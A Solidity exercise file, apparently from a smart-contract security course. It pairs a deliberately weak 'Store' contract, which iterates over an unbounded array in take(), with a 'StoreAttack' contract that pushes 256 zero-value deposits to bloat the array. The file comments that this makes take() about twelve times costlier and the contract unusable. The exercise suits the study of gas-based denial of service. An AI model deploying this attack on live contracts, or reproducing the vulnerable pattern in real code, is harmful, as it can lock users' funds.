pragma solidity ^0.4.24;

//*** Exercice 4 ***//
// Contract to store and redeem money.
contract Store {
    struct Safe {
        address owner;
        uint amount;
    }

    Safe[] public safes;

    /// @dev Store some ETH.
    function store() payable {
        safes.push(Safe({owner: msg.sender, amount: msg.value}));
    }

    /// @dev Take back all the amount stored.
    function take() {
        for (uint i; i<safes.length; ++i) {
            Safe safe = safes[i];
            if (safe.owner==msg.sender && safe.amount!=0) {
                msg.sender.transfer(safe.amount);
                safe.amount=0;
            }
        }

    }
}

contract StoreAttack {
    Store victim;

    constructor(address _victim) public {
        victim = Store(_victim);
    }
    //again with the overflows...
    function attack() external returns(bool success) {
        ////~8156964 = 250 stores
        //take now costs 225194 gas
        require(gasleft() > 30000000);
        //let's make the contract unusable by creating 100s of safes
        for (uint i; i< 256 ; ++i) {
            victim.store(); //victim doesn't require msg.value to be bigger than 0...
        }
        return true;
    }

//exec cost for take function before attack: 20462, after attack: 242473 ~12x :-)

}
